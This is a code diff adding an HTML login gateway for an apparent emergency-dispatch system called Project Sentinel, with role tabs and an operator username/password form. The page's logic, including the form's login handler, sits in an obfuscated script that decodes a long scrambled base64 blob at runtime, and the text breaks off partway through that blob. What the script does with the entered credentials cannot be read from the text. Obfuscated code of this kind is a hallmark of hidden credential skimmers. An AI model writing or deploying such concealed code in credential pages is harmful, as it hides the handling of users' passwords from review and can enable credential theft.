@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>Operator Authentication Gateway | Project Sentinel</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        /* 
+         * Dedicated Authentication & Role Routing Gateway (login.html)
+         * Note to self: Keep this page free of any dispatch tables or admin forms.
+         * It verifies credentials via Supabase RPC and stores a tab-scoped session
+         * in sessionStorage before redirecting to dispatch.html or admin.html.
+         */
+        :root {
+            --bg-base: #080b10;
+            --bg-panel: #0d121a;
+            --bg-elevated: #121924;
+            --border-hairline: #1c2331;
+            --border-accent: #283548;
+            --text-primary: #f1f5f9;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
+            --accent-cyan: #0ea5e9;
+            --accent-cyan-bright: #38bdf8;
+            --accent-amber: #f59e0b;
+            --accent-emerald: #10b981;
+            --accent-crimson: #ef4444;
+            --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            --font-mono: 'IBM Plex Mono', ui-monospace, SFMono-Regular, Menlo, monospace;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background-color: var(--bg-base);
+            background-image:
+                linear-gradient(to right, rgba(28, 35, 49, 0.35) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(28, 35, 49, 0.35) 1px, transparent 1px);
+            background-size: 48px 48px;
+            color: var(--text-primary);
+            font-family: var(--font-sans);
+            -webkit-text-size-adjust: 100%;
+        }
+
+        a {
+            color: inherit;
+            text-decoration: none;
+        }
+
+        .mono {
+            font-family: var(--font-mono);
+        }
+
+        .top-bar {
+            border-bottom: 1px solid var(--border-hairline);
+            background-color: rgba(8, 11, 16, 0.94);
+            padding: 0.85rem 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 1rem;
+        }
+
+        .brand-lockup {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .brand-shield {
+            width: 34px;
+            height: 34px;
+            flex-shrink: 0;
+        }
+
+        .return-link {
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            color: var(--text-secondary);
+            padding: 0.4rem 0.75rem;
+            border: 1px solid var(--border-hairline);
+            background-color: var(--bg-panel);
+            border-radius: 3px;
+            transition: border-color 0.15s ease, color 0.15s ease;
+        }
+
+        .return-link:hover {
+            border-color: var(--accent-cyan);
+            color: var(--text-primary);
+        }
+
+        .gateway-stage {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
+
+        .auth-panel {
+            width: 100%;
+            max-width: 460px;
+            background-color: var(--bg-panel);
+            border: 1px solid var(--border-accent);
+            border-radius: 3px;
+        }
+
+        .panel-header {
+            padding: 0.75rem 1.25rem;
+            background-color: var(--bg-elevated);
+            border-bottom: 1px solid var(--border-hairline);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            color: var(--text-secondary);
+        }
+
+        .panel-body {
+            padding: 1.75rem 1.5rem;
+        }
+
+        .title-block {
+            margin-bottom: 1.25rem;
+        }
+
+        .title-block h1 {
+            font-size: 1.25rem;
+            font-weight: 800;
+            letter-spacing: -0.01em;
+            color: var(--text-primary);
+        }
+
+        .title-block p {
+            font-size: 0.8125rem;
+            color: var(--text-secondary);
+            margin-top: 0.35rem;
+            line-height: 1.5;
+        }
+
+        /* Role destination selector tabs */
+        .role-selector {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            border: 1px solid var(--border-accent);
+            background-color: var(--bg-base);
+            border-radius: 3px;
+            margin-bottom: 1.25rem;
+        }
+
+        .role-tab {
+            padding: 0.65rem 0.5rem;
+            text-align: center;
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            color: var(--text-secondary);
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.15s ease, color 0.15s ease;
+        }
+
+        .role-tab:first-child {
+            border-right: 1px solid var(--border-accent);
+        }
+
+        .role-tab.active-dispatch {
+            background-color: rgba(14, 165, 233, 0.16);
+            color: var(--accent-cyan-bright);
+        }
+
+        .role-tab.active-admin {
+            background-color: rgba(245, 158, 11, 0.16);
+            color: var(--accent-amber);
+        }
+
+        .field-group {
+            margin-bottom: 1rem;
+        }
+
+        .field-label {
+            display: block;
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            color: var(--text-secondary);
+            margin-bottom: 0.4rem;
+        }
+
+        .field-input {
+            width: 100%;
+            padding: 0.65rem 0.85rem;
+            background-color: var(--bg-base);
+            border: 1px solid var(--border-accent);
+            border-radius: 3px;
+            color: var(--text-primary);
+            font-family: var(--font-mono);
+            font-size: 0.875rem;
+            outline: none;
+            transition: border-color 0.15s ease;
+        }
+
+        .field-input:focus {
+            border-color: var(--accent-cyan-bright);
+        }
+
+        .error-box {
+            display: none;
+            margin-bottom: 1rem;
+            padding: 0.65rem 0.85rem;
+            background-color: rgba(239, 68, 68, 0.12);
+            border-left: 3px solid var(--accent-crimson);
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            color: #fca5a5;
+            line-height: 1.4;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            background-color: var(--accent-cyan);
+            border: 1px solid #0284c7;
+            border-radius: 3px;
+            color: #ffffff;
+            font-size: 0.78rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            cursor: pointer;
+            transition: background-color 0.15s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #0284c7;
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.55;
+            cursor: not-allowed;
+        }
+
+        .submit-btn.admin-mode {
+            background-color: #d97706;
+            border-color: #b45309;
+        }
+
+        .submit-btn.admin-mode:hover {
+            background-color: #b45309;
+        }
+
+        .panel-footer {
+            padding: 0.85rem 1.5rem;
+            border-top: 1px solid var(--border-hairline);
+            background-color: #06090e;
+            font-family: var(--font-mono);
+            font-size: 0.68rem;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        @media (max-height: 540px) and (orientation: landscape) {
+            .top-bar { padding: 0.45rem 1rem; }
+            .gateway-stage { padding: 0.75rem; }
+            .panel-body { padding: 1rem 1.25rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="top-bar">
+        <a href="index.html" class="brand-lockup">
+            <svg viewBox="0 0 200 200" class="brand-shield" xmlns="http://www.w3.org/2000/svg">
+                <path d="M 100 20 L 165 50 V 105 C 165 148, 100 180, 100 180 C 100 180, 35 148, 35 105 V 50 Z" fill="#121924" stroke="#38bdf8" stroke-width="5" stroke-linejoin="round" />
+                <circle cx="100" cy="100" r="22" fill="none" stroke="#38bdf8" stroke-width="2" stroke-dasharray="6 3" />
+                <circle cx="100" cy="100" r="7" fill="#ef4444" />
+            </svg>
+            <div>
+                <div style="font-size: 0.85rem; font-weight: 800; letter-spacing: 0.08em; text-transform: uppercase;">Project Sentinel</div>
+                <div class="mono" style="font-size: 0.65rem; color: var(--accent-cyan-bright);">Authentication Gateway // Node 443</div>
+            </div>
+        </a>
+
+        <a href="index.html" class="return-link">← Public Portal</a>
+    </header>
+
+    <main class="gateway-stage">
+        <div class="auth-panel">
+            <div class="panel-header">
+                <span id="gateway-mode-label">TARGET // TIER 3 STATION DISPATCH</span>
+                <span>TLS 1.3 VERIFIED</span>
+            </div>
+
+            <div class="panel-body">
+                <div class="title-block">
+                    <h1 id="gateway-title">Responder Station Sign-In</h1>
+                    <p id="gateway-subtitle">
+                        Enter your authorized station operator credentials to access live telemetry and multi-agency dispatch controls.
+                    </p>
+                </div>
+
+                
+                <div class="role-selector" role="tablist">
+                    <button type="button" id="tab-dispatch" class="role-tab active-dispatch" onclick="selectTargetConsole('DISPATCH')">
+                        Tier 3 Dispatch
+                    </button>
+                    <button type="button" id="tab-admin" class="role-tab" onclick="selectTargetConsole('ADMIN')">
+                        Master Admin
+                    </button>
+                </div>
+
+                <div id="auth-error-box" class="error-box"></div>
+
+                <form id="gateway-login-form" onsubmit="handleGatewayLogin(event)">
+                    <div class="field-group">
+                        <label class="field-label" for="op-username">Operator Callsign / Username</label>
+                        <input id="op-username" type="text" class="field-input" autocomplete="username" required placeholder="e.g., pnp_mexico or superadmin">
+                    </div>
+
+                    <div class="field-group">
+                        <label class="field-label" for="op-password">Operator Password</label>
+                        <input id="op-password" type="password" class="field-input" autocomplete="current-password" required placeholder="••••••••••••">
+                    </div>
+
+                    <button type="submit" id="gateway-submit-btn" class="submit-btn">
+                        Authenticate &amp; Open Dispatch Console
+                    </button>
+                </form>
+            </div>
+
+            <div class="panel-footer">
+                <span>ALISTO NETWORK PH</span>
+                <span>RA 10173 &amp; COA AUDIT LOGGED</span>
+            </div>
+        </div>
+    </main>
+
+    <script>(function(){var d=atob('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